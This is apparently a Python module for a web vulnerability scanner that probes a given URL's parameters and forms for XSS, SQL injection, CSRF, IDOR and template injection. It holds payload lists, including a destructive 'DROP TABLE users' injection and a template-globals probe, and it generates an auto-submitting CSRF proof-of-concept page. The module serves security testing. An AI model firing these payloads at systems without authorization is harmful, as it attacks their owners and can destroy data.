import logging
import requests
import re
from urllib.parse import urlparse, parse_qsl, urlencode, urljoin
from bs4 import BeautifulSoup
import datetime

def get_csrf_token(html_content, target):
    """Extract CSRF token from HTML content."""
    soup = BeautifulSoup(html_content, 'html.parser')
    
    # Look for common CSRF token field names
    csrf_fields = [
        'csrf_token',
        'csrf',
        'csrfmiddlewaretoken',
        'CSRFToken',
        'CSRF-Token',
        'XSRF-TOKEN',
        '_csrf',
        '_token',
        'authenticity_token'
    ]
    
    # Check for input fields
    for field in csrf_fields:
        input_field = soup.find('input', {'name': field})
        if input_field and input_field.get('value'):
            return {
                'name': field,
                'value': input_field['value'],
                'location': 'input field'
            }
    
    # Check for meta tags
    meta_csrf = soup.find('meta', {'name': re.compile('csrf', re.I)})
    if meta_csrf and meta_csrf.get('content'):
        return {
            'name': meta_csrf.get('name', 'csrf-token'),
            'value': meta_csrf['content'],
            'location': 'meta tag'
        }
    
    # Check response headers for CSRF token
    # This would require the original response headers, which we don't have here,
    # so this is just illustrative
    
    return None

def test_xss(target, payload):
    """Test for Cross-Site Scripting vulnerabilities."""
    results = {'vulnerable': False, 'details': {}}
    
    if not payload:
        # Default XSS payloads if none provided
        payloads = [
            '<script>alert(1)</script>',
            '"><script>alert(1)</script>',
            '\'><script>alert(1)</script>',
            '<img src=x onerror=alert(1)>',
            '<svg onload=alert(1)>',
            'javascript:alert(1)'
        ]
    else:
        payloads = [payload]
    
    # Parse URL to separate parameters
    parsed_url = urlparse(target)
    params = dict(parse_qsl(parsed_url.query))
    
    # Test in URL parameters
    if params:
        for param_name in params:
            for test_payload in payloads:
                try:
                    # Create new params with payload
                    test_params = params.copy()
                    test_params[param_name] = test_payload
                    
                    # Reconstruct URL
                    test_url = parsed_url._replace(query=urlencode(test_params)).geturl()
                    
                    # Send request
                    response = requests.get(test_url, timeout=10)
                    
                    # Check if payload is reflected in response
                    if test_payload in response.text:
                        results['vulnerable'] = True
                        results['details'][param_name] = {
                            'payload': test_payload,
                            'url': test_url,
                            'reflected': True
                        }
                except Exception as e:
                    logging.error(f"Error testing XSS in parameter {param_name}: {str(e)}")
    
    # Test in POST form fields if found
    try:
        response = requests.get(target, timeout=10)
        soup = BeautifulSoup(response.text, 'html.parser')
        
        for form in soup.find_all('form'):
            if form.get('method', '').lower() != 'get':  # Focus on POST forms
                form_action = form.get('action', '')
                if not form_action:
                    form_url = target  # Form submits to current page
                elif form_action.startswith('/'):
                    # Relative URL
                    form_url = urljoin(target, form_action)
                else:
                    form_url = form_action
                
                # Get form fields
                form_data = {}
                for input_field in form.find_all(['input', 'textarea']):
                    if input_field.get('name'):
                        form_data[input_field['name']] = input_field.get('value', '')
                
                # Get CSRF token if any
                csrf_token = get_csrf_token(response.text, target)
                if csrf_token:
                    form_data[csrf_token['name']] = csrf_token['value']
                
                # Test each field
                for field_name in form_data:
                    for test_payload in payloads:
                        try:
                            test_data = form_data.copy()
                            test_data[field_name] = test_payload
                            
                            # Send POST request
                            post_response = requests.post(form_url, data=test_data, timeout=10)
                            
                            # Check if payload is reflected
                            if test_payload in post_response.text:
                                results['vulnerable'] = True
                                results['details'][f"form_field_{field_name}"] = {
                                    'payload': test_payload,
                                    'form_url': form_url,
                                    'method': 'POST',
                                    'reflected': True
                                }
                        except Exception as e:
                            logging.error(f"Error testing XSS in form field {field_name}: {str(e)}")
    except Exception as e:
        logging.error(f"Error testing XSS in forms: {str(e)}")
    
    return results

def test_sql_injection(target, payload):
    """Test for SQL Injection vulnerabilities."""
    results = {'vulnerable': False, 'details': {}}
    
    if not payload:
        # Default SQL injection payloads
        payloads = [
            "'",
            "' OR '1'='1",
            "' OR '1'='1' --",
            "'; DROP TABLE users; --",
            "1' OR '1'='1",
            "admin' --",
            "admin'; --",
            "' UNION SELECT NULL, NULL, NULL, NULL, NULL --",
            "' UNION SELECT @@version, NULL, NULL, NULL, NULL --"
        ]
    else:
        payloads = [payload]
    
    # Parse URL to separate parameters
    parsed_url = urlparse(target)
    params = dict(parse_qsl(parsed_url.query))
    
    # Function to check for SQL error patterns
    def check_sql_errors(response_text):
        error_patterns = [
            'SQL syntax',
            'mysql_fetch_array',
            'mysqli_fetch_array',
            'ORA-01756',
            'Error Executing Database Query',
            'SQLite3::query',
            'Microsoft SQL Native Client error',
            'ODBC SQL Server Driver',
            'PostgreSQL',
            'SQLSTATE',
            'syntax error at or near',
            'unclosed quotation mark after the character string'
        ]
        
        for pattern in error_patterns:
            if pattern.lower() in response_text.lower():
                return True
        return False
    
    # Function to check for abnormal responses
    def is_abnormal_response(original_response, test_response):
        # Check for significant length difference
        len_diff = abs(len(original_response.text) - len(test_response.text))
        if len_diff > 50:  # Arbitrary threshold
            return True
        
        # Check for status code changes
        if original_response.status_code != test_response.status_code:
            return True
            
        return False
    
    # Test in URL parameters
    if params:
        # Get baseline response
        try:
            baseline_response = requests.get(target, timeout=10)
        except Exception as e:
            logging.error(f"Error getting baseline response: {str(e)}")
            return {'error': str(e)}
        
        for param_name in params:
            for test_payload in payloads:
                try:
                    # Create new params with payload
                    test_params = params.copy()
                    test_params[param_name] = test_payload
                    
                    # Reconstruct URL
                    test_url = parsed_url._replace(query=urlencode(test_params)).geturl()
                    
                    # Send request
                    response = requests.get(test_url, timeout=10)
                    
                    # Check for SQL errors
                    if check_sql_errors(response.text):
                        results['vulnerable'] = True
                        results['details'][param_name] = {
                            'payload': test_payload,
                            'url': test_url,
                            'evidence': 'SQL error in response',
                            'error_based': True
                        }
                    
                    # Check for abnormal responses (potential blind SQLi)
                    elif is_abnormal_response(baseline_response, response):
                        results['vulnerable'] = True
                        results['details'][param_name] = {
                            'payload': test_payload,
                            'url': test_url,
                            'evidence': 'Abnormal response detected',
                            'blind': True,
                            'original_length': len(baseline_response.text),
                            'test_length': len(response.text)
                        }
                except Exception as e:
                    logging.error(f"Error testing SQLi in parameter {param_name}: {str(e)}")
    
    # Test in POST forms (similar to XSS testing)
    try:
        response = requests.get(target, timeout=10)
        soup = BeautifulSoup(response.text, 'html.parser')
        
        for form in soup.find_all('form'):
            if form.get('method', '').lower() != 'get':  # Focus on POST forms
                form_action = form.get('action', '')
                if not form_action:
                    form_url = target  # Form submits to current page
                elif form_action.startswith('/'):
                    # Relative URL
                    form_url = urljoin(target, form_action)
                else:
                    form_url = form_action
                
                # Get form fields
                form_data = {}
                for input_field in form.find_all(['input', 'textarea']):
                    if input_field.get('name'):
                        form_data[input_field['name']] = input_field.get('value', '')
                
                # Get CSRF token if any
                csrf_token = get_csrf_token(response.text, target)
                if csrf_token:
                    form_data[csrf_token['name']] = csrf_token['value']
                
                # Get baseline response
                try:
                    baseline_post_response = requests.post(form_url, data=form_data, timeout=10)
                except Exception as e:
                    logging.error(f"Error getting baseline POST response: {str(e)}")
                    continue
                
                # Test each field
                for field_name in form_data:
                    for test_payload in payloads:
                        try:
                            test_data = form_data.copy()
                            test_data[field_name] = test_payload
                            
                            # Send POST request
                            post_response = requests.post(form_url, data=test_data, timeout=10)
                            
                            # Check for SQL errors
                            if check_sql_errors(post_response.text):
                                results['vulnerable'] = True
                                results['details'][f"form_field_{field_name}"] = {
                                    'payload': test_payload,
                                    'form_url': form_url,
                                    'method': 'POST',
                                    'evidence': 'SQL error in response',
                                    'error_based': True
                                }
                            
                            # Check for abnormal responses
                            elif is_abnormal_response(baseline_post_response, post_response):
                                results['vulnerable'] = True
                                results['details'][f"form_field_{field_name}"] = {
                                    'payload': test_payload,
                                    'form_url': form_url,
                                    'method': 'POST',
                                    'evidence': 'Abnormal response detected',
                                    'blind': True,
                                    'original_length': len(baseline_post_response.text),
                                    'test_length': len(post_response.text)
                                }
                        except Exception as e:
                            logging.error(f"Error testing SQLi in form field {field_name}: {str(e)}")
    except Exception as e:
        logging.error(f"Error testing SQLi in forms: {str(e)}")
    
    return results

def test_csrf(target):
    """Test for CSRF vulnerabilities."""
    results = {'vulnerable': False, 'details': {}}
    
    try:
        # Get the page
        response = requests.get(target, timeout=10)
        soup = BeautifulSoup(response.text, 'html.parser')
        
        # Look for forms
        for form in soup.find_all('form'):
            form_action = form.get('action', '')
            if not form_action:
                form_url = target
            elif form_action.startswith('/'):
                form_url = urljoin(target, form_action)
            else:
                form_url = form_action
            
            # Check for CSRF token in the form
            csrf_token = None
            
            # Common CSRF token field names
            csrf_fields = [
                'csrf_token',
                'csrf',
                'csrfmiddlewaretoken',
                'CSRFToken',
                'CSRF-Token',
                'XSRF-TOKEN',
                '_csrf',
                '_token',
                'authenticity_token'
            ]
            
            for field in csrf_fields:
                token_field = form.find('input', {'name': field})
                if token_field:
                    csrf_token = {
                        'name': field,
                        'value': token_field.get('value', '')
                    }
                    break
            
            # Check for CSRF in meta tags if not found in form
            if not csrf_token:
                meta_csrf = soup.find('meta', {'name': re.compile('csrf', re.I)})
                if meta_csrf and meta_csrf.get('content'):
                    csrf_token = {
                        'name': meta_csrf.get('name', 'csrf-token'),
                        'value': meta_csrf['content'],
                        'location': 'meta tag'
                    }
            
            # If no CSRF token found and it's a POST form, it might be vulnerable
            if not csrf_token and form.get('method', '').lower() == 'post':
                # Collect form fields for a CSRF PoC
                form_fields = []
                for input_field in form.find_all(['input', 'textarea', 'select']):
                    if input_field.get('name'):
                        field_info = {
                            'name': input_field['name'],
                            'type': input_field.get('type', 'text')
                        }
                        if input_field.get('value'):
                            field_info['value'] = input_field['value']
                        form_fields.append(field_info)
                
                results['vulnerable'] = True
                results['details'][form_url] = {
                    'reason': 'No CSRF token found in POST form',
                    'form_action': form_url,
                    'method': form.get('method', 'post').upper(),
                    'fields': form_fields,
                    'csrf_poc': generate_csrf_poc(form_url, form_fields, form.get('method', 'post').upper())
                }
    except Exception as e:
        logging.error(f"Error testing CSRF: {str(e)}")
        results['error'] = str(e)
    
    return results

def generate_csrf_poc(action_url, fields, method='POST'):
    """Generate a CSRF Proof of Concept HTML form."""
    html = f"""
    <!DOCTYPE html>
    <html>
    <head>
        <title>CSRF PoC</title>
    </head>
    <body>
        <h1>CSRF Proof of Concept</h1>
        <form action="{action_url}" method="{method.lower()}" id="csrf-form">
    """
    
    for field in fields:
        field_type = field.get('type', 'text')
        field_name = field.get('name', '')
        field_value = field.get('value', '')
        
        html += f'    <input type="{field_type}" name="{field_name}" value="{field_value}" />\n'
    
    html += """
        </form>
        <script>
            // Automatically submit the form when page loads
            document.getElementById("csrf-form").submit();
        </script>
    </body>
    </html>
    """
    
    return html

def test_idor(target, payload):
    """Test for Insecure Direct Object Reference vulnerabilities."""
    results = {'vulnerable': False, 'details': {}}
    
    if not payload:
        # Default IDOR test payloads
        # For a proper IDOR test, we need authenticated requests with different users
        # This is a simplified approach
        id_variations = [
            '1',
            '2',
            '0',
            '-1',
            '9999',
            'admin'
        ]
    else:
        id_variations = [payload]
    
    # Look for ID parameters in URL
    parsed_url = urlparse(target)
    params = dict(parse_qsl(parsed_url.query))
    
    # ID pattern in URL path
    path = parsed_url.path
    id_pattern = re.search(r'/(\d+)(?:/|$)', path)
    
    if id_pattern:
        original_id = id_pattern.group(1)
        base_path = path[:id_pattern.start(1)]
        end_path = path[id_pattern.end(1):]
        
        baseline_response = None
        try:
            baseline_response = requests.get(target, timeout=10)
        except Exception as e:
            logging.error(f"Error getting baseline response: {str(e)}")
            return {'error': str(e)}
        
        for variation in id_variations:
            if variation == original_id:
                continue
                
            try:
                test_path = base_path + variation + end_path
                test_url = parsed_url._replace(path=test_path).geturl()
                
                response = requests.get(test_url, timeout=10)
                
                # Check if response is successful and content differs from baseline
                if response.status_code == 200 and len(response.text) > 100:
                    # Simple check: if the response is successful and has meaningful content
                    # and it's different from the baseline, it might indicate IDOR
                    similarity = calculate_similarity(baseline_response.text, response.text)
                    
                    if similarity < 0.8 and similarity > 0.3:  # Arbitrary thresholds
                        results['vulnerable'] = True
                        results['details'][test_url] = {
                            'original_id': original_id,
                            'tested_id': variation,
                            'similarity': similarity,
                            'status_code': response.status_code,
                            'response_length': len(response.text)
                        }
            except Exception as e:
                logging.error(f"Error testing IDOR with ID {variation}: {str(e)}")
    
    # Test ID parameters in query string
    id_params = [param for param in params if re.search(r'id$|^id|_id', param, re.I)]
    
    if id_params:
        baseline_response = None
        try:
            baseline_response = requests.get(target, timeout=10)
        except Exception as e:
            logging.error(f"Error getting baseline response: {str(e)}")
            return {'error': str(e)}
        
        for param in id_params:
            original_value = params[param]
            
            for variation in id_variations:
                if variation == original_value:
                    continue
                    
                try:
                    test_params = params.copy()
                    test_params[param] = variation
                    
                    test_url = parsed_url._replace(query=urlencode(test_params)).geturl()
                    
                    response = requests.get(test_url, timeout=10)
                    
                    # Check if response is successful and content differs from baseline
                    if response.status_code == 200 and len(response.text) > 100:
                        similarity = calculate_similarity(baseline_response.text, response.text)
                        
                        if similarity < 0.8 and similarity > 0.3:  # Arbitrary thresholds
                            results['vulnerable'] = True
                            results['details'][test_url] = {
                                'parameter': param,
                                'original_value': original_value,
                                'tested_value': variation,
                                'similarity': similarity,
                                'status_code': response.status_code,
                                'response_length': len(response.text)
                            }
                except Exception as e:
                    logging.error(f"Error testing IDOR with parameter {param}={variation}: {str(e)}")
    
    return results

def calculate_similarity(text1, text2):
    """Calculate a simple similarity ratio between two texts."""
    # This is a very simple implementation
    # For production, consider using more sophisticated methods
    if not text1 or not text2:
        return 0
    
    # Convert to sets of words for a basic comparison
    words1 = set(re.findall(r'\w+', text1.lower()))
    words2 = set(re.findall(r'\w+', text2.lower()))
    
    if not words1 or not words2:
        return 0
    
    # Jaccard similarity
    intersection = len(words1.intersection(words2))
    union = len(words1.union(words2))
    
    return intersection / union if union > 0 else 0

def test_ssti(target, payload):
    """Test for Server-Side Template Injection."""
    results = {'vulnerable': False, 'details': {}}
    
    if not payload:
        # Default SSTI test payloads for various template engines
        payloads = [
            '${7*7}',
            '{{7*7}}',
            '{7*7}',
            '<%= 7*7 %>',
            '#{7*7}',
            '${{7*7}}',
            '{{config}}',
            '{{config.__class__.__init__.__globals__}}',
            '{{request}}',
            '{{self}}',
            '{php}echo 7*7;{/php}'
        ]
    else:
        payloads = [payload]
    
    # Parse URL
    parsed_url = urlparse(target)
    params = dict(parse_qsl(parsed_url.query))
    
    # Function to check for SSTI evidence in response
    def check_ssti_evidence(response_text, payload):
        # Check for common SSTI result patterns
        if '${7*7}' in payload:
            return '49' in response_text
        elif '{{7*7}}' in payload:
            return '49' in response_text
        elif '{7*7}' in payload:
            return '49' in response_text
        elif '<%= 7*7 %>' in payload:
            return '49' in response_text
        elif '#{7*7}' in payload:
            return '49' in response_text
        elif '${{7*7}}' in payload:
            return '49' in response_text
        elif 'config' in payload:
            return 'Config' in response_text or 'ConfigLoader' in response_text
        elif 'request' in payload and '{{' in payload:
            return 'Request' in response_text or 'request' in response_text
        elif 'self' in payload and '{{' in payload:
            return 'self' in response_text.lower() or 'proxy' in response_text.lower()
        elif '{php}' in payload:
            return '49' in response_text
        
        return False
    
    # Test URL parameters
    if params:
        for param_name in params:
            for test_payload in payloads:
                try:
                    # Create new params with payload
                    test_params = params.copy()
                    test_params[param_name] = test_payload
                    
                    # Reconstruct URL
                    test_url = parsed_url._replace(query=urlencode(test_params)).geturl()
                    
                    # Send request
                    response = requests.get(test_url, timeout=10)
                    
                    # Check for SSTI evidence
                    if check_ssti_evidence(response.text, test_payload):
                        results['vulnerable'] = True
                        results['details'][param_name] = {
                            'payload': test_payload,
                            'url': test_url,
                            'evidence': 'Template engine execution detected',
                            'response_fragment': response.text[:200]  # First 200 chars for reference
                        }
                except Exception as e:
                    logging.error(f"Error testing SSTI in parameter {param_name}: {str(e)}")
    
    # Test in POST forms
    try:
        response = requests.get(target, timeout=10)
        soup = BeautifulSoup(response.text, 'html.parser')
        
        for form in soup.find_all('form'):
            form_action = form.get('action', '')
            if not form_action:
                form_url = target
            elif form_action.startswith('/'):
                form_url = urljoin(target, form_action)
            else:
                form_url = form_action
            
            # Get form fields
            form_data = {}
            for input_field in form.find_all(['input', 'textarea']):
                if input_field.get('name'):
                    form_data[input_field['name']] = input_field.get('value', '')
            
            # Get CSRF token if any
            csrf_token = get_csrf_token(response.text, target)
            if csrf_token:
                form_data[csrf_token['name']] = csrf_token['value']
            
            # Test each field
            for field_name in form_data:
                for test_payload in payloads:
                    try:
                        test_data = form_data.copy()
                        test_data[field_name] = test_payload
                        
                        # Send request using form method
                        method = form.get('method', 'get').lower()
                        if method == 'post':
                            test_response = requests.post(form_url, data=test_data, timeout=10)
                        else:
                            test_response = requests.get(form_url, params=test_data, timeout=10)
                        
                        # Check for SSTI evidence
                        if check_ssti_evidence(test_response.text, test_payload):
                            results['vulnerable'] = True
                            results['details'][f"form_field_{field_name}"] = {
                                'payload': test_payload,
                                'form_url': form_url,
                                'method': method.upper(),
                                'evidence': 'Template engine execution detected',
                                'response_fragment': test_response.text[:200]
                            }
                    except Exception as e:
                        logging.error(f"Error testing SSTI in form field {field_name}: {str(e)}")
    except Exception as e:
        logging.error(f"Error testing SSTI in forms: {str(e)}")
    
    return results

def perform_manual_testing(target, test_type, payload=None):
    """
    Main function for manual testing against OWASP Top 10 vulnerabilities.
    """
    if not target:
        return {'error': 'No target specified'}
    
    # Ensure target has scheme
    if not target.startswith(('http://', 'https://')):
        target = 'http://' + target
    
    logging.info(f"Starting {test_type} test for {target}")
    
    results = {
        'target': target,
        'test_type': test_type,
        'timestamp': datetime.datetime.now().isoformat(),
        'results': {}
    }
    
    if test_type == 'xss':
        results['results'] = test_xss(target, payload)
    elif test_type == 'sql_injection':
        results['results'] = test_sql_injection(target, payload)
    elif test_type == 'csrf':
        results['results'] = test_csrf(target)
    elif test_type == 'idor':
        results['results'] = test_idor(target, payload)
    elif test_type == 'ssti':
        results['results'] = test_ssti(target, payload)
    else:
        results['error'] = f"Unsupported test type: {test_type}"
    
    return results
